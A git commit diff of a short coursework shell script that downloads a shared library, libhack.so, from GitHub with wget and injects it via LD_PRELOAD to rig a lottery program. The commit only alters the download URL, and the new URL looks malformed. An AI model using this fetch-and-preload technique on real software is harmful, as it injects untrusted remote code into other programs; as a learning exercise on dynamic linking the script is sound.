8c213f9c5e9de154a2b2a657c402ce05656f510b
parksomin72 <fatimazahraealawi@gmail.com>
2024-03-02 08:24:13 -0800

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P .. https://github.com/parksomin72/alx-low_level_programming/blob/12404600cc7d1524ec100ac2c0204be4c49cf3dd/0x18-dynamic_libraries/libhack.so
+wget -P ..  https://github.com/parksomin72/alx-low_level_programming/master/0x18-dynamic_libraries/libhack.so
 export LD_PRELOAD="$PWD/../libhack.so"
